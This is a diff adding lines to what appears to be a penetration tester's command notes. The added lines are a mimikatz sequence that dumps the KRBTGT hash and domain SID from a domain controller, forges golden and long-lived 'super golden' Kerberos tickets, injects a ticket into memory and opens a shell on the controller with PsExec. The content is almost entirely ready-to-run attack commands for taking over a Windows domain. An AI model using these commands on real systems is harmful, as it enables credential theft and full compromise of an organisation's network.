@@ -55,3 +55,24 @@ misc::memssp
 
 c:\windows\system32\mimilsa.log
 
+# Golden ticket information - Dump SID and KRBTGT hash (on DC) от АДМИНИСТРАТОРА
+PS C:\pentst> .\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # token::elevate (DONT NEED THIS)
+mimikatz # lsadump::lsa /patch
+
+# Create golden ticket (write to file in this case)
+PS C:\Tools> .\mimikatz.exe
+mimikatz # kerberos::purge
+
+mimikatz # kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424464709-3473652527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:golden
+
+# Super golden ticket
+kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424464709-3473652527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:corp_super_golden /endin:2147483647
+
+# Inject ticket to memory
+C:\Tools> mimikatz.exe
+mimikatz # kerberos::ptt golden
+
+# PsExec to DC
+PsExec64.exe \\dc01 cmd.exe
